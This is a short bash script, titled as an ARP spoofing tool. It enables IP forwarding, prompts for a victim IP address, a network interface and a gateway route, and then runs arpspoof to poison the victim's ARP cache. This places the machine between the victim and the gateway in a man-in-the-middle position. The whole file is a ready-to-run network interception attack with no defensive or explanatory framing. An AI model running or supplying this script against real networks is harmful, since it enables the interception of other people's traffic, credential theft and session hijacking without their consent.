#!/bin/bash

# SCRIPT FOR ARPSPOOFING

echo current ip forwarding
cat /proc/sys/net/ipv4/ip_forward

echo enabling ip forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

echo Enter ip victim:
read ip_victim
echo

echo Interfaces:
ip link
echo Enter interface:
read interface
echo

echo Route:
ip route
echo Enter ip route:
read ip_route 
echo

echo Arpspoofing on interface $interface and target $ip_victim with route $ip_route
sudo arpspoof -i $interface -t $ip_victim -r $ip_route

